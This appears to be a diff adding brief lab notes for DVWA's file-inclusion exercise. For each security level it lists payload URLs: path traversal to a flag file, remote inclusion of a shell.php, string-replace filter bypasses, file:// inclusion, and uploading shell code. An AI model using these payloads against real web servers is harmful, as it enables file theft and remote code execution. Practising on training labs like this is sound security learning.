@@ -1,0 +1,16 @@
+Low
+    Run shell and cat php
+    http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
+    http://localhost/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:8000/FileInclusion/shell.php
+
+Medium
+    Run Shell and Cat php
+    Use URL to bypass String replace
+    http://localhost/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
+    http://localhost/DVWA/vulnerabilities/fi/?page=httphttp://://127.0.0.1:8000/FileInclusion/shell.php
+
+High
+    Run shell and Cat php 
+    Use file notation
+    http://localhost/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
+    Upload shell code and run in similar manner
